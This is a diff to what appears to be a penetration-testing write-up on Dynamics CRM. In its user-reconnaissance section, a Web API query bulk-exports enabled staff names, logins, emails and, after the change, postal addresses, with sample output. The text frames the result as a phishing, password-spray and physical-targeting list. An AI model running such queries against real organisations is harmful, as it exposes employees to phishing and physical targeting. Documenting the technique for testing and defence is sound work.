@@ -164,18 +164,19 @@ Authorization: Bearer &lt;token&gt;
 
     <h2 class="ui header"><i class="address book icon"></i> User Reconnaissance</h2>
     <p>The <code>systemuser</code> table is the org directory, and any role with even modest read on
-    it turns into a bulk export of names, login names, and email addresses — a ready-made phishing
-    and password-spray list. I paged the enabled users, tagged by business unit:</p>
+    it turns into a bulk export of names, login names, email addresses, and even postal addresses —
+    a ready-made phishing, password-spray, and physical-targeting list. I paged the enabled users,
+    tagged by business unit:</p>
     <pre>GET https://org.crm.dynamics.com/api/data/v9.2/systemusers
-      ?$select=fullname,domainname,internalemailaddress,isdisabled
+      ?$select=fullname,domainname,internalemailaddress,address1_composite,isdisabled
       &amp;$expand=businessunitid($select=name)
       &amp;$filter=isdisabled eq false&amp;$top=5000
 Authorization: Bearer &lt;token&gt;
 
 {
   "value": [
-    { "fullname": "Jane R.", "domainname": "jane.r@example.com",  "businessunitid": { "name": "EMEA Sales" } },
-    { "fullname": "Omar K.", "domainname": "omar.k@example.com",  "businessunitid": { "name": "Claims Processing" } },
+    { "fullname": "Jane R.", "domainname": "jane.r@example.com", "address1_composite": "220 King St W, Toronto, ON M5H 1K4, Canada", "businessunitid": { "name": "EMEA Sales" } },
+    { "fullname": "Omar K.", "domainname": "omar.k@example.com", "address1_composite": "14 Rue de la Paix, 75002 Paris, France",     "businessunitid": { "name": "Claims Processing" } },
     ... hundreds more ...
   ]
 }</pre>
